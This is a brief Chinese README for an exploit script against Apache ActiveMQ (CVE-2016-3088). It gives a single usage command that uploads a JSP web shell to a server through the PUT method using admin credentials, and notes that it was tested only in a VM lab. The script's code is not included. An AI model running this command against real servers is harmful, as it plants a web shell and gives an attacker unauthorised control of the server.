# ActiveMQ的PUT 上传getshellExP CVE-2016-3088

Author:CF_HB

时间：2016年6月8日

漏洞参考地址: http://zone.wooyun.org/content/27737

exp使用例子：
原理参见zone里白帽子刺刺的分析，上传shell用法如下：
    python ActiveMQExP.py -url http://192.168.18.133:8161/ -user admin -pass admin -shell D://shell.jsp

代码略粗陋，欢迎测试和反馈。
1. 只在虚拟机测试环境下测试过，环境：windows server MQ版本5.8
2. 因为测试环境少，所以可能有很多bug，欢迎提供测试环境或者直接反馈bug.
